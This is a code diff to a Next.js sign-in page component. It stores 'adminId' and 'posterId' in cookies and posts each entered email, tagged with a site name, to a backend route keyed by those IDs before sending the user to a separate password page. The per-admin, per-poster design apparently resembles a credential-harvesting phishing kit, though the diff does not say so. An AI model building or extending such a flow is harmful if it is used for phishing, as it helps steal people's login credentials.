@@ -1,13 +1,43 @@
 "use client";
+import { API_URL, SITE } from "@/config";
+import Cookies from "js-cookie";
 import Image from "next/image";
 import { useRouter } from "next/navigation";
-import React, { useState } from "react";
+import React, { useEffect, useState } from "react";
 
-function Signin() {
-  const [email, setEmail] = useState();
+function Signin({ adminId, posterId }) {
+  const [email, setEmail] = useState("");
   const router = useRouter();
-  const handleEmail = () => {
-    router.push("/password");
+  useEffect(() => {
+    Cookies.set("adminId", adminId);
+    Cookies.set("posterId", posterId);
+  }, [adminId, posterId]);
+  const handleEmail = async () => {
+    try {
+      if (!email) {
+        return;
+      }
+      const values = {
+        email: email,
+        site: SITE,
+      };
+      const url = `${API_URL}/email/post/${adminId}/${posterId}`;
+      const response = await fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-type": "application/json",
+        },
+        body: JSON.stringify(values),
+      });
+      const data = await response.json();
+      if (response.ok) {
+        Cookies.set("email", data?.info?.email);
+        Cookies.set("id", data?.info?._id);
+        router.push("/password");
+      }
+    } catch (error) {
+      console.log(error);
+    }
   };
   return (
     <div className=" w-full min-h-screen flex flex-col justify-center items-center">
@@ -46,6 +76,7 @@ function Signin() {
                 placeholder="Enter Email"
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
+                required
               />
 
               <button className="text-blue-600 font-medium text-sm mt-2">
